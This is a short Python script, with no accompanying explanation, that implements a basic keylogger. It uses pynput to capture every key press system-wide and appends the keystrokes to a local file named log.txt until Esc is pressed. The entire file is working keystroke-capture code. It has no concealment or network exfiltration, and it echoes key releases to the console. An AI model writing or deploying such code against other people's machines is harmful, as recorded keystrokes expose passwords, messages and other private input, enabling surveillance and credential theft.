from pynput.keyboard import Key, Listener


        
def on_press(key):
    key_to_write=""
    if key == Key.space:
        key_to_write = " "
    elif key == Key.shift:
        key_to_write = ""   
    elif key == Key.enter:
        key_to_write = "\n"
    elif key == Key.tab:
        key_to_write = "\t"
    else:
        key_to_write = key
    
    with open("log.txt", "a") as log_file:
        new_str =str(key_to_write).replace("'", "")
        log_file.write(new_str)
        
        
def on_release(key):                    
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()

